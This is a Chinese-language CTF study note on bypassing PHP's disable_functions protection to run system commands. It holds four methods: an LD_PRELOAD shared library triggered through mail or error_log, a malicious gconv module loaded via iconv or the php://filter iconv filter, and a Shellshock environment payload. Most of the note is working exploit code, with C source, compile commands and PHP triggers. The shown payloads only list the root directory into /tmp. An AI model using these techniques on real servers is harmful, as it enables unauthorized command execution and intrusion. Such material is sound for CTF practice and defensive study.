# 主要思路
	- 使用环境变量等方式控制php执行c库中的函数，从而绕过php自带的disable_function安全机制
- # 参考
	- https://www.lxscloud.top/2022/04/15/PHP-Bypass-disable_function/
	- [[CTFWEB/PHP/FFI]]
- # 提示
	- 下面的方式都需要写入文件，实际操作时可以考虑使用[[CTFWEB/PHP/利用FTP进行文件写入]]进行文件写入
- # 方式一
	- 要求
		- 允许函数putenv()和error_log()或mail()且存在可写目录和可以传输文件到靶机
	- 步骤
		- 把这个编译为`exp.so`扔进某个文件夹（例如`/tmp/`）中
			- ```c
			  #include <stdlib.h>
			  #include <stdio.h>
			  
			  int geteuid() {
			  	if(getenv("LD_PRELOAD") != NULL) { 
			  		unsetenv("LD_PRELOAD");
			  		system("ls / > /tmp/t.txt"); // payload在这
			  	} else {
			  		return 0;
			  	}
			  }
			  ```
			- ```shell
			  gcc exp.c -o exp.so -shared -fPIC
			  ```
		- PHP执行
			- ```php
			  <?php 
			  putenv("LD_PRELOAD=/tmp/exp.so");
			  # exp.so在下面这行被调用
			  error_log("",1,"","");
			  # 当然我们还有
			  mb_send_mail("a@localhost","","","","");
			  # 当然我们还有
			  mail("","","","");
			  ?>
			  ```
- # 方式二
  id:: 64f02a3a-0eae-4d6c-8b73-8b34d2a17473
	- 注意
		- 这里复现时有一个坑，就是如果PHP执行没反应需要多执行几次（大概手搓十几次这样）
	- 要求
		- 允许函数putenv()、iconv()和可以传输文件到靶机
	- 步骤
		- 把这个编译了放进目标中（比如说放进`/tmp/exp.so`）
			- ```c
			  #include <stdio.h> 
			  #include <stdlib.h> 
			  
			  void gconv() {
			  }
			  
			  void gconv_init() {  
			  	system("ls / > /tmp/t.txt");
			  }
			  ```
			- ```shell
			  gcc exp.c -o exp.so -shared -fPIC
			  ```
		- 把这个写进同一个文件夹（这里是`/tmp/`）中的`gconv-modules`中
			- ```text
			  module  exp//    INTERNAL    /tmp/exp    2
			  module  INTERNAL   exp//    /tmp/exp    2
			  ```
		- 最后执行这里的php
			- ```php
			  <?php 
			  putenv("GCONV_PATH=/tmp/"); // 当然这里是tmp文件夹
			  iconv("exp", "UTF-8", "");
			  ?>
			  ```
- # 方式三
	- 方式二的变种
	- 要求：允许putenv和使用convert.iconv这个`php://`伪协议的filter
	- 步骤：和方式二相同，只不过执行的PHP变成这个：
		- ```php
		  <?php
		  putenv("GCONV_PATH=/tmp/"); 
		  include('php://filter/read=convert.iconv.exp.utf-8/resource=/proc/self/cmdline');
		  ?>
		  ```
- # 方式四
	- > 未复现
	- 当然是shell shock
		- ```php
		  <?php
		  putenv("PHP_flag=() { :; }; ls / > /tmp/t.txt");
		  error_log("",1,"","");
		  ?>
		  
		  ```